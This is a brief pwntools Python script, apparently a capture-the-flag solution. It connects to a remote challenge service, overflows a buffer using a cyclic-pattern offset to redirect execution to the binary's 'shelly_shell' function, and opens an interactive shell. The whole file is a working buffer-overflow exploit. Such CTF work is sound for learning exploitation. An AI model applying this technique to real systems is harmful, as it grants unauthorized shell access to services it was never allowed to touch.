from pwn import *

elf = ELF("./shelly")

r = remote("shelly.heltsikker.no", 9002)

r.recvuntil("?: ")

r.sendline(fit({
    cyclic_find(0x61616165): p64(elf.symbols.shelly_shell)
}))

r.interactive()